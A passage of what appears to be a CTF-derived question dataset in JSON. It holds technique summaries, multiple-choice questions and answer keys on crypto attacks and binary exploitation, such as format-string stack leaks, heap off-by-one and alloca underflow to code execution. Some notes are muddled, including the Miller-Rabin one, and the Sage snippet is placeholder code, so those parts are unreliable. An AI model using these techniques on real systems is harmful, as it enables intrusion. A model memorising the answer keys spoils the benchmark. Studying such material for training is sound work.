        "write_up": "dataset/raw/poetry.md",
        "type": "misc",
        "competition": [
            "PlaidCTF/2023",
            "https://ctftime.org/event/1770/tasks/"
        ],
        "score": 550,
        "max_score": 700,
        "difficulty": 0.7857142857142857,
        "knowledge": [
            "When crafting assembly code to meet specific textual constraints for challenges like poetry composition, utilizing phonetic spelling based on phonemes can be key. This involves designing code so that it fits into a required pattern of vowels (stressed, unstressed, or optionally stressed) and rhymes, as determined by the patterns of phonetic symbols associated with the words used. If a challenge requires lines to follow a certain vowel pattern (such as stressed and unstressed) or rhyme scheme, one effective strategy is to select assembly instructions or operands whose phonetic spellings align with these requirements. This may involve consulting a phonetic dictionary to ensure compatibility.",
            "In scenarios where assembly code needs to adhere to intricate constraints like vowel patterns and rhymes, instructions such as NOP (\"no operation\") can be particularly useful for filling or aligning patterns without impacting the operational logic of the code. Utilizing NOPs or other instructions with phonetically suitable representations (like \"pop\" for rhyming with \"nop\") can assist in successfully passing the constraints while maintaining the functional integrity of the assembly code. This approach enables the code to meet both its linguistic and functional requirements, demonstrating a creative intersection of programming and linguistic analysis.\n\nExample strategy for crafting compliant lines:\n- To end lines with NOP for a rhyme scheme: append \"nop\" (which rhymes with \"pop\") at strategic points.\n- For a vowel pattern \"10101010011\", use instructions or registers pronounced with a mix of stressed and unstressed vowels, verifying against a phonetic dictionary like `dictionary.arpa`."
        ],
        "question": [
            "When attempting to comply with specific textual constraints in assembly code for a challenge that involves phonetic patterns, which of the following strategies would be most effective for ensuring the code lines follow a required pattern of vowels and rhymes?  - A. Choosing instructions based on their hexadecimal value relevance to the desired outcome. - B. Selecting instructions or operands with phonetic spellings that fit required stressed, unstressed, or optionally stressed vowel patterns, consulting a phonetic dictionary as needed. - C. Implementing a majority of arithmetic operations to fulfill the vowel and rhyme requirements. - D. Focusing solely on the operational efficiency of the code irrespective of its phonetic attributes. ",
            "In a context where assembly code must adhere to specific vowel patterns and rhymes as part of a challenge, how can NOP instructions be utilized effectively?  - A. By incorporating NOP instructions at random intervals to increase code complexity. - B. Utilizing NOP instructions to artificially prolong the execution time of the program. - C. Employing NOPs as placeholders for future code adjustments, without a focus on phonetic patterns. - D. Using NOP instructions for aligning with linguistic constraints such as vowel patterns and rhymes, especially by ending lines with NOP to fit into a rhyme scheme like \"nop\" rhyming with \"pop\". "
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "Poison 280",
        "write_up": "dataset/raw/Poison 280.md",
        "type": "crypto",
        "competition": [
            "0xL4ugh/2024",
            "https://ctftime.org/event/2216/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When facing challenges involving elliptic curve cryptography, one strategy is to exploit the deterministic nature of private key alterations. If a challenge involves manipulating bits of a private key (`my_priv`) in a predictable manner (e.g., flipping bits from 0 to 1 or 1 to 0), equations can be constructed based on the cryptographic operations (e.g., scalar multiplication and point addition) to reverse-engineer the original private key. This is particularly effective when the result of operations with the altered key can be compared against operations using the unaltered key.",
            "In scenarios where cryptographic operations yield results that depend on the bit changes in a private key, the sign of the resulting operation (e.g., `dec = C2 - p_m*C1 = M + kG(p - p_m)`) can indicate whether the bit was flipped from 0 to 1 (result is negative) or from 1 to 0 (result is positive). This sign-based method allows for the reconstruction of the original private key bit by bit. A practical application of this method requires iterating through each bit, performing the specified cryptographic operations, and observing the signs of the outcomes to deduce each bit's original value.  \n   \nSample sage script snippet to apply this knowledge:\n\n```py\nfrom sage.all import *\n\n# Assuming elliptic curve E, points C1, C2, dec from challenge setup\n\nbinstr = ''  \nfor i in range(0, length_of_private_key):  \n    M = point_on_curve  # point M from setup\n    C1 = point_on_curve  # point C1 from setup\n    C2 = point_on_curve  # point C2 from setup\n    dec = point_on_curve  # decrypted point from setup\n    \n    dec_minus_M = dec - M\n    \n    if dec_minus_M == -C1:\n        binstr += '0'  # Bit was flipped from 1 to 0\n    elif dec_minus_M == C1:\n        binstr += '1'  # Bit was flipped from 0 to 1\n\n# Convert binstr to the flag\n```"
        ],
        "question": [
            "In an elliptic curve cryptography challenge, the scenario involves manipulating the bits of a private key to uncover the original key. If the private key is modified bit by bit in a deterministic way, which of the following strategies would allow for the reverse engineering of the original private key? - A. Calculating the difference between the output of elliptic curve operations with and without the bit manipulation. - B. Using hash collisions to recover the unaltered private key. - C. Employing frequency analysis on the encrypted messages. - D. Brute-forcing all possible bit permutations of the key.",
            "Given a cryptographic operation that outputs a sign based on bit changes in a private key, such as `dec = C2 - p_m*C1 = M + kG(p - p_m)`, which observation is crucial for reconstructing the original private key, one bit at a time? - A. The magnitude of the scalar `k` used in the operation. - B. The difference in the number of 1s and 0s in the binary representation of the private key. - C. Whether the result of the operation is positive or negative, indicating if a bit was flipped from 1 to 0 or 0 to 1. - D. The elliptic curve's equation and its coefficients."
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Poison Prime",
        "write_up": "dataset/raw/Poison Prime.md",
        "type": "crypto",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 299,
        "max_score": 299,
        "difficulty": 1.0,
        "knowledge": [
            "In Diffie-Hellman key exchange challenges where the attacker can choose the prime `p`, selecting a Mersenne prime (`p = 2^k - 1`) forces any generator `g` into a small subgroup, making the system more vulnerable. The security of the system is compromised because the order of `g` becomes predictably small, limiting the complexity of the discrete logarithm problem.",
            "For ensuring the chosen prime `p` is not easily flagged as backdoored in challenges requiring a proof of a large prime factor of `p-1`, use factoring databases like http://factordb.com/ to find primes like `p` where `p-1` contains a large prime factor, meeting the validation requirements without compromising the ability to attack the implementation efficiently."
        ],
        "question": [
            "In a scenario where attackers can pick the prime `p` in a Diffie-Hellman key exchange, and they choose a Mersenne prime (`p = 2^k - 1`), what is the main advantage of selecting a Mersenne prime for the attacker? - A.It ensures that `p` will always be larger than any possible generator `g`, maximizing the security of the system. - B.It makes the prime `p` easily recognizable, ensuring quick identification by other cryptographic systems. - C.It forces any generator `g` into a small subgroup, making the system more vulnerable due to the predictably small order of `g`. - D.It allows for the private keys to be more easily exchanged over insecure channels without risk of interception.",
            "When attempting to ensure that a chosen prime `p` is not easily flagged as backdoored in systems that require a large prime factor of `p-1`, which approach is beneficial for an attacker? - A.Using prime numbers that are well-known and commonly used in textbooks to guarantee acceptance. - B.Selecting primes `p` where `p-1` has no large prime factors, ensuring the system's random number generator is maximized in efficiency. - C.Utilizing cryptography forums to crowdsource finding a prime `p` with the desired properties, ensuring community validation. - D.Employing factoring databases like http://factordb.com/ to find primes `p` where `p-1` contains a large prime factor, meeting validation requirements without compromising attack efficiency."
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Polish",
        "write_up": "dataset/raw/Polish.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 477,
        "max_score": 477,
        "difficulty": 1.0,
        "knowledge": [
            "When given the lower bits of the private key \\(d\\) in an RSA challenge, it's feasible to factorize the modulus \\(n\\) in polynomial time of the public exponent \\(e\\). This factorization can be achieved by solving quadratic congruences to compute candidates for the lower half bits of \\(p\\) or \\(q\\), and then applying Coppersmith's method for finding small roots of polynomials. This is based on the theoretical groundwork provided in \"Twenty Years of Attacks on the RSA Cryptosystem,\" which discusses utilizing the lower quarter of \\(d\\) bits for factorizing \\(n\\). This approach can be instrumental in challenges where partial key exposure allows for an attack route not immediately evident through conventional decryption or direct factorization attempts.",
            "In challenges involving diophantine equations as part of cryptographic schemes, transforming the equation to solve for variables in terms of others can simplify the problem. In the given challenge, the transformation process involves substituting variables \\(u = x + y\\) and \\(v = xy\\) into the equation to formulate a new equation that relates \\(u\\) and \\(v\\) in a manner that leverages the already established cryptographic relationships, such as factoring \\(n\\). Specifically, factoring the modified equation can lead to computing potential values for \\(u\\) and \\(v\\), and subsequently solving quadratic equations for \\(x\\) and \\(y\\). This method can be particularly effective in scenarios where indirect relationships between variables can be exploited to solve for unknowns, facilitating the decryption process or revealing hidden information necessary for challenge completion."
        ],
        "question": [
            "In the context of RSA where the modulus $n$ and a portion of the private key $d$ (221 LSBs) are provided, which polynomial congruence solving approach is applied before utilizing Coppersmith's method for factorizing $n$? - A. Solving for the upper half bits of $p$ directly without using the known bits of $d$. - B. Computing $\\mathcal{O}(e \\log_2 e)$ candidates for the lower half bits of $p$ by solving quadratic congruences. - C. Applying Coppersmith's method directly on $n$ without computing candidates for $p$. - D. Factoring $n$ directly using the public exponent $e$ without considering the bits of $d$. ",
            "In cryptographic challenges involving Diophantine equations, when the equation is transformed to $uv - a(u^2 - 2v) = b$ and $n = 4a^3 + b$, which of the following steps is correct in determining the values for $u$ and $v$, thereby solving for $x$ and $y$? - A. Multiplying $uv$ by $a$ to directly solve for $x$ and $y$ without considering the factorization of $n$. - B. Dividing both sides by $u + 2a$ and attempting to solve for $v$ directly, independent of $n$\u2019s factors. - C. Factoring $4a^3 + b$ to compute the possible values for $u$, and subsequently finding $v$ to solve the quadratic equations for $x$ and $y$. - D. Solving for $v$ by applying Coppersmith's method on the equation $uv = b$ without factoring or using $n$. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Polynomial Time",
        "write_up": "dataset/raw/Polynomial Time.md",
        "type": "crypto",
        "competition": [
            "KillerQueen/2021",
            "https://ctftime.org/event/1482/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering a CTF challenge where the security of the system is based on the unpredictability of random numbers, if the system uses a Mersenne Twister pseudo-random number generator (PRNG) it can be exploited. Specifically, after observing 624 outputs from a Mersenne Twister, future outputs can be predicted. Utilizing libraries like `mt19937predictor`, one can predict the state of the PRNG and subsequently predict future outputs. These outputs could be crucial values such as keys or internal state variables.\n   - Condition: This approach applies when the challenge involves predicting future values of a PRNG that is known to be a Mersenne Twister, and at least 624 of its outputs can be observed directly or indirectly.\n   - Knowledge: By collecting and feeding 624 observed outputs into a prediction tool or library, future outputs of the PRNG can be calculated, potentially revealing sensitive information or enabling further exploitation.\n   - Example Payload: No specific payload, but the process involves collecting the outputs into an array and then using `predictor.getrandbits(512)` to predict future values.",
            "In challenges involving polynomial operations where the naive approach leads to prohibitively high time complexity, utilize algorithms or techniques that break down the problem into smaller parts or use faster algorithms for specific operations like FFT (Fast Fourier Transform) for polynomial multiplication. Specifically, for tasks that require evaluating a polynomial at multiple points efficiently, use multi-point evaluation algorithms which reduce the overall time complexity significantly, employing techniques like the construction of a binary tree of polynomials.\n   - Condition: This is applicable in scenarios where evaluating a polynomial at multiple points directly is too slow, typically due to the polynomial having a high degree or needing to evaluate at many points.\n   - Knowledge: Employ efficient algorithms for multi-point polynomial evaluation that leverage FFT or construct a binary tree where each node represents a polynomial, significantly reducing the time complexity from \\(O(n^2)\\) or \\(O(n^2 \\log n)\\) to \\(O(n \\log^2 n)\\).\n   - Example Payload: No specific payload, but the implementation involves creating a binary tree where leaf nodes represent the polynomials for individual points, and internal nodes represent the product of polynomials of their child nodes. Subsequently, evaluate the given polynomial mod the polynomial at each tree node to efficiently compute the desired evaluations at all points."
        ],
        "question": [
            "When analyzing an application that employs a Mersenne Twister pseudo-random number generator for security-related purposes, which of the following strategies could be effectively used to predict future outputs, assuming at least 624 outputs can be observed?  - A. Perform a differential cryptographic attack to deduce the PRNG seed. - B. Analyze the algorithm's source code to find vulnerabilities in its implementation. - C. Collect 624 outputs and use a specific prediction tool or library designed for Mersenne Twister to calculate future values. - D. Increase the computational power to brute-force predict the next sequence of outputs. ",
            "In a scenario where evaluating a polynomial of high degree at multiple points is required, but direct evaluation is computationally expensive, which technique is recommended to reduce the overall time complexity?  - A. Decomposing the polynomial into linear factors and evaluating each factor separately. - B. Applying a multi-point evaluation strategy that involves constructing a binary tree of polynomials and leveraging techniques like FFT for efficient polynomial operations. - C. Reducing the polynomial degree by approximating it with a lower degree polynomial before evaluation. - D. Transforming the polynomial evaluation into a matrix multiplication problem and applying conventional linear algebra techniques. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "PolyRSA",
        "write_up": "dataset/raw/PolyRSA.md",
        "type": "crypto",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "In challenges involving RSA over polynomial rings, the totient can be calculated using the formula `phi(n) = (p^f1.degree()-1)*(p^f2.degree()-1)*...*(p^fk.degree()-1)`, where `f1, f2, ..., fk` are the polynomial factors of `n`. This is crucial for determining the decryption exponent `d` in polynomial-ring-based RSA cryptosystems. Condition: This approach is applicable when working with RSA cryptography implemented in polynomial rings and requires factorization of the polynomial `n`.",
            "The decryption process in RSA challenges involving polynomial rings involves computing the inverse of the encryption exponent `e` modulo the totient of `n` (calculated using the formula in point 1), followed by raising the ciphertext polynomial to the power of this decryption exponent `d` modulo the polynomial `n`. This method can reveal the flag when each coefficient of the resulting polynomial represents an ASCII value of the flag characters. Condition: This method is used for decrypting messages in RSA schemes based on polynomial rings, assuming the ability to factorize `n` and convert polynomial coefficients to readable ASCII text."
        ],
        "question": [
            "In the context of RSA encryption using polynomial rings, the totient (\\(\\phi\\)) of a polynomial \\(n = f_1\\cdot f_2\\cdot...\\cdot f_k\\) is calculated using a specific formula. If \\(p\\) is a prime number and \\(f1, f2, ..., fk\\) are the polynomial factors of \\(n\\), which of the following represents the correct formula to calculate \\(\\phi(n)\\)? - A. \\(\\phi(n) = (p^{f_1.degree()}+1)\\cdot(p^{f_2.degree()}+1)\\cdot...\\cdot(p^{f_k.degree()}+1)\\) - B. \\(\\phi(n) = (p-1)^{f_1.degree()}\\cdot(p-1)^{f_2.degree()}\\cdot...\\cdot(p-1)^{f_k.degree()}\\) - C. \\(\\phi(n) = (p^{f_1.degree()}-1)\\cdot(p^{f_2.degree()}-1)\\cdot...\\cdot(p^{f_k.degree()}-1)\\) - D. \\(\\phi(n) = p^{(f_1.degree()+f_2.degree()+...+f_k.degree())}\\) ",
            "During the decryption phase of an RSA challenge involving polynomial rings, a specific procedure is followed to reveal the plaintext from a given ciphertext polynomial \\(ct\\) and a polynomial modulus \\(n\\). Given an encryption exponent \\(e = 65537\\) and having calculated the totient of \\(n\\) (\\(\\phi(n)\\)) through the appropriate formula, which step correctly describes how to decrypt the message to reveal the flag? - A. Calculate the sum \\(d = e + \\phi(n)\\) and then evaluate \\(ct^{d} \\mod n\\). - B. Directly apply \\(e^{-1} \\mod n\\) to each coefficient of \\(ct\\). - C. Compute \\(d = inverse\\_mod(e,\\phi(n))\\) and then raise \\(ct\\) to the power \\(d\\) modulo \\(n\\). - D. Multiply \\(ct\\) by \\(e\\) and then divide by \\(n\\), taking the remainder as the result. "
        ],
        "answer": [
            "C. \\(\\phi(n) = (p^{f_1.degree()}-1)\\cdot(p^{f_2.degree()}-1)\\cdot...\\cdot(p^{f_k.degree()}-1)\\)",
            "C. Compute \\(d = inverse\\_mod(e,\\phi(n))\\) and then raise \\(ct\\) to the power \\(d\\) modulo \\(n\\)."
        ]
    },
    {
        "name": "pow-pow",
        "write_up": "dataset/raw/pow-pow.md",
        "type": "crypto",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 299,
        "max_score": 500,
        "difficulty": 0.598,
        "knowledge": [
            "In challenges featuring verifiable delay functions (VDFs) where the verification function is provided, it is possible to manipulate inputs to satisfy the verification without executing the intended costly computation. This is achieved by selecting specific values that conform to the verification function's requirements in an unintended way. For instance, choosing a parameter such that its order or its relation to other parameters simplifies the verification equation, thereby bypassing the need for the intended long computation.",
            "For solving challenges that involve operations with large numbers and congruences under modular arithmetic, using smooth numbers (numbers with only small prime factors) can significantly simplify computations. Specifically, selecting a value that is a product of small prime numbers (such as the factorial of a number or the product of all primes below a certain threshold) can make it divisible by a wide range of other numbers, including those generated dynamically within the challenge's logic. This approach is particularly effective in scenarios where the challenge involves random or pseudorandom values that need to be factored into or divided by the selected value.\n\n**Example Payload:**\n- No specific payload is given, but the method involves generating a \"smooth\" number, typically the product of primes up to a certain threshold, and using this to manipulate challenge parameters in a way that satisfies the verification equation without performing the intended computation."
        ],
        "question": [
            "In a cryptographic challenge involving a verifiable delay function (VDF), where the objective is to manipulate inputs to bypass time-consuming computations for verification. Suppose you are given a function `verify(g, h, pi)` that checks whether `h == pow(pi, m, n) * pow(g, r, n) % n` holds true, considering `r` and `m` are indirectly controlled by the inputs `g` and `h`. Which of the following options best represents an approach to bypassing the intended VDF computation? - A. Pick `g`, `h`, and `pi` at random and hope they satisfy the verification by chance. - B. Factor `n` to directly calculate `g^r * pi^m mod n` without going through the computation. - C. Select specific values for `g`, `h`, and `pi` making use of the properties of the verification equation to satisfy it without performing the VDF computation as intended. - D. Directly compute `g^r * pi^m mod n` using a brute-force approach. ",
            "When faced with the need to select a specific number to simplify computations in challenges involving modular arithmetic and large numbers, why would choosing a \"smooth\" number be advantageous, especially in scenarios requiring divisibility by dynamically generated numbers within a cryptographic challenge? - A. Smooth numbers are easier to remember and thereby make manual calculations more straightforward. - B. Smooth numbers contain only large prime factors, making them inherently secure against factorization attacks. - C. Selecting a smooth number, defined as a product of small primes, simplifies the task of finding a number that is divisible by a broad range of other numbers, including those generated within the challenge's logic. - D. The use of smooth numbers significantly increases the computational complexity required, adding an extra layer of security. "
        ],
        "answer": [
            "C. Select specific values for `g`, `h`, and `pi` making use of the properties of the verification equation to satisfy it without performing the VDF computation as intended.",
            "C. Selecting a smooth number, defined as a product of small primes, simplifies the task of finding a number that is divisible by a broad range of other numbers, including those generated within the challenge's logic."
        ]
    },
    {
        "name": "PQ",
        "write_up": "dataset/raw/PQ.md",
        "type": "crypto",
        "competition": [
            "TSG/2019",
            "https://ctftime.org/event/758/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In scenarios involving RSA encryption challenges where the encrypted message and public key (N, e) are provided, but the prime factors (p, q) are unknown, factorization tools or libraries like `sympy` can be used to find these prime factors. This technique is especially effective when the product of p and q (N) is not too large, allowing for successful factorization. Once the prime factors are determined, they can be used to compute the private key component (d), essential for decrypting the message.",
            "To calculate the modular inverse of two numbers, which is a crucial step in computing the private key (d) in RSA encryption, the Extended Euclidean Algorithm (EGCD) can be utilized. This algorithm not only finds the greatest common divisor (GCD) of two numbers but also the coefficients (x and y) that satisfy the equation ax + by = gcd(a, b). In the context of RSA, obtaining the modular inverse of e mod phi(N) (where phi(N) is Euler's totient function of N), is necessary for finding the decryption key d. This approach is universally applicable for reconstructing private keys in RSA when the prime factors of N are known. \n\nExample of computing modular inverse using EGCD:\n```python\ndef egcd(a, b):  \n    if a == 0:  \n        return (b, 0, 1)  \n    g, y, x = egcd(b % a, a)  \n    return (g, x - (b // a) * y, y)\n\ndef modinv(a, m):  \n    g, x, y = egcd(a, m)  \n    if g != 1:  \n        raise Exception('modular inverse does not exist')  \n    else:  \n        return x % m\n```"
        ],
        "question": [
            "In the context of decrypting an RSA-encrypted message, when given the encrypted message and the public key components (N, e) without the prime factors (p, q), which Python library is most suitable for factoring N to find p and q?  - A. numpy - B. sympy - C. matplotlib - D. pandas ",
            "When computing the private key (d) for RSA decryption, which algorithm is critical for finding the modular inverse of the public exponent (e) relative to Euler's totient function of N (phi(N))?  - A. Sieve of Eratosthenes - B. Fast Fourier Transform - C. Extended Euclidean Algorithm (EGCD) - D. Binary search algorithm "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Precise average",
        "write_up": "dataset/raw/Precise average.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 104,
        "max_score": 500,
        "difficulty": 0.208,
        "knowledge": [
            "When exploiting off-by-one vulnerabilities in heap exploitation challenges, manipulating the metadata of adjacent memory chunks can enable arbitrary memory writes or information leaks. Specifically, altering the size of a chunk can allow for overlapping chunks which can be used to leak libc addresses or facilitate double-free vulnerabilities for further exploitation.",
            "In challenges involving format string vulnerabilities, especially when canary protection is present, it may be possible to bypass this protection and achieve arbitrary code execution by carefully crafting input to avoid overwriting critical security features. For example, using input that causes `scanf` to fail (like \"-\") can prevent the overwrite of the canary while still causing a stack buffer overflow, allowing for control over the program's execution flow without triggering security mechanisms."
        ],
        "question": [
            "In a heap exploitation challenge featuring an off-by-one vulnerability, which technique is utilized to manipulate adjacent memory chunk's metadata for arbitrary memory manipulations? - A. Modifying the `free` list pointer to insert controlled data - B. Changing the size attribute of a memory chunk to create overlapping chunks - C. Incrementing the reference count of an object to prevent it from being freed - D. Altering the alignment of memory chunks to cause a heap consolidation ",
            "In a challenge where input to a `scanf` call can lead to a stack buffer overflow but canary protection is present, what unique input pattern allows an attacker to bypass canary protection without overwriting the canary? - A. Submitting a string that is exactly the length of the buffer - B. Using a null byte (\"\\x00\") to terminate input early - C. Submitting a \"-\" (dash) character to cause `scanf` to fail and not write to the buffer - D. Padding the input with spaces to align the stack frame without overwriting the canary "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Prefix sums",
        "write_up": "dataset/raw/Prefix sums.md",
        "type": "This CTF challenge type is **crypto**.",
        "competition": [
            "ByteCTF/2020",
            "https://ctftime.org/event/1114/tasks/"
        ],
        "score": 290,
        "max_score": 375,
        "difficulty": 0.7733333333333333,
        "knowledge": [
            "When faced with combinatorial problems involving sequences or strings of elements (like parentheses, bits, or any binary state), the combination of mathematical formulas and programming can be used to count valid sequences. If a problem's condition is such that one type of element must always outnumber the other at any point in the sequence, solutions involving modified Catalan numbers or Catalan's triangle can be particularly effective. This methodology also applies to counting balanced sequences, such as parentheses or bracket sequences. In such a context, one can leverage the online encyclopedia of integer sequences (OEIS) to search for known sequences matching initial brute-force results, potentially leading to a closed formula.",
            "To optimize computations involving very large numbers, especially when dealing with ratios of combinatorial quantities, simplifying the expressions mathematically before programming them can be crucial. This approach is particularly useful when the numbers involved are too cumbersome for direct computation. For instance, in problems requiring the ratio of two combinatorial numbers as the answer, it may be possible to simplify the expression to a simpler form by applying combinatorial identities or properties, thereby avoiding direct computation of potentially massive numbers. Furthermore, the greatest common divisor (gcd) function can be used to reduce fractions to their simplest form before encoding them as part of a solution or flag.\n\nSample of payload for simplification process:\n\n```python\nfrom math import gcd\n\n# Assuming these values are derived from the problem's requirements\nn = 3141592653589793238\np = 101124131231734\n\n# Compute the simplified ratio as the answer\nnum = n - 2 * p\nden = n\ng = gcd(num, den)  # Simplifying the fraction\n\nnum //= g\nden //= g\n\n# Encoded or simplified form ready for further use\n```\n\nThis approach is universal for problems requiring the computation of ratios or probabilities involving combinatorial counts, especially in scenarios where direct calculation is impractical due to the scale of numbers."
        ],
        "question": [
            "When evaluating sequences that must adhere to the constraint where one element type predominates over another at any given point, which mathematical concept is especially applicable for counting such valid sequences? - A. Pythagorean triples - B. Modified Catalan numbers or Catalan's triangle - C. Fibonacci sequence - D. Prime number distribution",
            "In solving problems involving the ratio of two large combinatorial numbers, which mathematical operation is crucial for simplifying fractions to their simplest form, thereby avoiding direct computation of large numbers? - A. Calculating the least common multiplier (LCM) - B. Applying Euler's totient function - C. Using the greatest common divisor (gcd) function - D. Determining the modular inverse"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Prejudiced Randomness 1",
        "write_up": "dataset/raw/Prejudiced Randomness 1.md",
        "type": "crypto",
        "competition": [
            "CCCamp/2019",
            "https://ctftime.org/event/854/tasks/"
        ],
        "score": 123,
        "max_score": 500,
        "difficulty": 0.246,
        "knowledge": [
            "When tasked with finding the square root of a number modulo n, where n is a product of two prime numbers, utilizing specially prepared primes (of the form 4k + 3) simplifies the process. For such primes, the square roots are directly calculable using the formula `\u00b1 s**((p + 1) / 4)`. This approach is advantageous in scenarios where one has control over the selection of primes, allowing for an efficient solution to finding square roots in modular arithmetic problems.",
            "To defeat checks for primality, especially when a system uses the Miller-Rabin primality test with a limited set of bases for testing, crafting composite numbers that pass as primes is feasible. The key lies in selecting composite numbers that fail the Miller-Rabin test for all chosen bases. If a system or algorithm only tests bases up to a certain number (e.g., less than 314), it's possible to construct composite numbers that are identified as primes by this limited test. This technique can be exploited in challenges where bypassing primality checks is necessary to achieve a goal, particularly when the system or challenge uses a flawed or incomplete implementation of the Miller-Rabin test."
        ],
        "question": [
            "In a cryptographic task involving modular arithmetic, if you need to find square roots modulo \\(n\\) where \\(n = p \\times q\\) and both \\(p\\) and \\(q\\) are primes of the form \\(4k + 3\\), which formula correctly calculates the square roots? - A. \\( \\pm s^{((p + 1) / 4)} \\) - B. \\( \\pm s^{((p - 1) / 4)} \\) - C. \\( \\pm s^{p} \\) - D. \\( \\pm s^{2} \\)",
            "In a scenario where you must ensure that a crafted composite number passes the Miller-Rabin primality test despite not being a prime, given that the system only checks primes with bases less than a specific number (e.g., 314), which strategy is most appropriate? - A. Selecting a composite number that has at least one witness among the chosen bases. - B. Choosing a number that is only divisible by 2 and itself. - C. Constructing a composite number that fails the Miller-Rabin test for all chosen bases. - D. Crafting a composite number that passes the test for all bases less than 314 by ensuring no witnesses among these bases."
        ],
        "answer": [
            "A.",
            "D."
        ]
    },
    {
        "name": "primitive",
        "write_up": "dataset/raw/primitive.md",
        "type": "crypto",
        "competition": [
            "StarCTF/2018",
            "https://ctftime.org/event/614/tasks/"
        ],
        "score": 869,
        "max_score": 909,
        "difficulty": 0.9559955995599559,
        "knowledge": [
            "When facing a challenge involving a substitution cipher with a given permutation and a limited set of allowed operations (ADD, ROL, XOR), one effective approach is to first decompose the cipher into a series of swaps (transpositions) and then focus on finding operations that implement these swaps. This decomposition simplifies the complex problem into manageable parts, where one can first target operations that map two specific values to 0 and 1, perform a swap, and then map them back to their original positions using inverse operations. This method requires experimentation and possibly brute force to identify the specific sequence of operations for each swap.",
            "In challenges where brute-forcing all possible combinations of operations (e.g., ADD, ROL, XOR) is unfeasible due to the large search space, it's crucial to prioritize reducing the search space. This can be achieved by identifying patterns or restrictions in the possible operations that lead to a solution, such as limiting the form of operation sequences to a manageable pattern (e.g., `ADD a, ROL b, XOR c, ADD d`). Further optimizations may involve conducting initial tests on a reduced problem scale (e.g., smaller number of bits) to identify effective strategies or operation sequences that can likely apply to the full problem scale. This approach streamlines the search process, making it possible to calculate and store all potential solutions efficiently. \n\nExample payload for a swap operation could resemble the sequence provided for `swap(0, 1)`: `ADD 254, ROL 7, ADD 1, ROL 1`, although the specific sequence might vary based on the problem's constraints and the targeted numbers to swap."
        ],
        "question": [
            "In a cryptography challenge involving a substitution cipher with a specific permutation, which of the following strategies is effective for decomposing the cipher to simplify the solution process? - A. Focus solely on finding a single set of operations that directly maps each byte to its permutation counterpart without decomposition. - B. Decompose the cipher into a series of swaps (transpositions) and identify operations for swapping two values, leveraging inverse operations to revert values to their original positions. - C. Create a random generator of operations until one accidentally matches the required permutation. - D. Solve the cipher linearly from the first byte to the last without attempting to break it down into simpler problems. ",
            "When faced with the challenge of brute-forcing operation sequences in a cryptographic task, which optimization strategy significantly reduces the search space, making the brute-force approach feasible? - A. Sequentially test every possible combination of operations without any pre-analysis to ensure no potential solution is overlooked. - B. Increase the complexity of operations by adding more operation types to the allowed list, such as `SUB` and `NOT`, to cover more possibilities. - C. Restrict the form of operation sequences to a specific manageable pattern (e.g., `ADD a, ROL b, XOR c, ADD d`) and perform initial tests on a reduced problem scale to identify likely effective strategies. - D. Only use one type of operation (e.g., `ADD`) with different operands to simplify the operations\u2019 effect on the permutation. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "printf",
        "write_up": "dataset/raw/printf.md",
        "type": "pwn",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "In a pwn challenge, when faced with a custom `printf` implementation lacking specific format specifiers (e.g., `%n`) but allowing for arbitrary format string vulnerabilities, an effective approach to exploit the challenge involves leveraging the functionality to leak stack variables to defeat ASLR. This method utilizes a controlled format string, such as `%lx|%lx|%lx|...`, to extract values from the stack, revealing addresses of variables, canaries, or libc pointers, which are crucial for crafting a successful exploit. This technique applies universally in scenarios where direct exploitation methods (e.g., writing to arbitrary addresses using `%n`) are unavailable or restricted by the challenge setup.\nExample of format string to leak addresses: `\"%lx|%lx|%lx|...`",
            "Exploitation of incorrect `alloca` behavior due to unchecked argument size can be approached by causing an intentional stack underflow, which, in combination with writable sections of libc or similar binaries, allows for control over function pointers (e.g., `FILE *` vtable entries) to gain arbitrary code execution. In scenarios where a binary's protections (e.g., relro) are weaker than expected, modifying the pointer to a one-gadget or system call within libc by overflow or underflow can achieve RCE (Remote Code Execution). This method is particularly effective in scenarios where direct code injection is impractical due to security mechanisms but control over program flow remains achievable through binary or libc vulnerabilities.\nExample payload segment to adjust stack and control flow: `%<large_number>d` and then writing `one_gadget` or similar RCE trigger address at calculated position."
        ],
        "question": [
            "In a binary exploiting challenge that involves an unsafe use of `alloca` through a custom `printf` function, which format string could be used to leak stack variables for bypassing ASLR when the `%n` specifier is not available? - A. `%lx|%lx|%lx|...` - B. `%s|%s|%s|...` - C. `%d|%d|%d|...` - D. `%c|%c|%c|...`",
            "Given a pwn challenge where a buggy implementation of a width specifier in a custom `printf` function allows an unchecked large value to cause stack underflow, which technique could effectively exploit this vulnerability to gain arbitrary code execution? - A. Using `%x` format specifier to overwrite return address directly. - B. Manipulating the argument to `alloca` to create a large buffer and overwrite function pointers such as `FILE *` vtable entries. - C. Triggering a heap overflow by manipulating `printf` buffer sizes. - D. Employing a double-free bug to corrupt heap metadata for arbitrary code execution."
        ],
        "answer": [
            "A.",
            "B."
        ]
    },
    {
        "name": "Prison Break",
